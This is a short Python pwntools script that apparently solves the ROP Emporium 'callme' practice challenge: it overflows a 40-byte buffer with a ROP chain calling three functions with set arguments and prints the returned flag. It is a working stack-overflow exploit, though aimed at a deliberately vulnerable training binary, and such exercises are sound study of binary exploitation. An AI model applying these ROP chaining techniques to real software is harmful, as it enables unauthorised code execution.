from pwn import *

elf = context.binary = ELF('./callme', checksec=False)
p = process()

padding = 40

rop = ROP(elf)  # Load rop gadgets

params = [0xdeadbeefdeadbeef,
          0xcafebabecafebabe,
          0xd00df00dd00df00d]

rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)

print(rop.dump())
# pprint(rop.gadgets)

# Rop chain
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

payload = flat(
    {padding: rop_chain}
)

write("payload", payload)


p.sendlineafter('>', payload)
p.recvuntil('Thank you!\n')

flag = p.recv()
success(flag)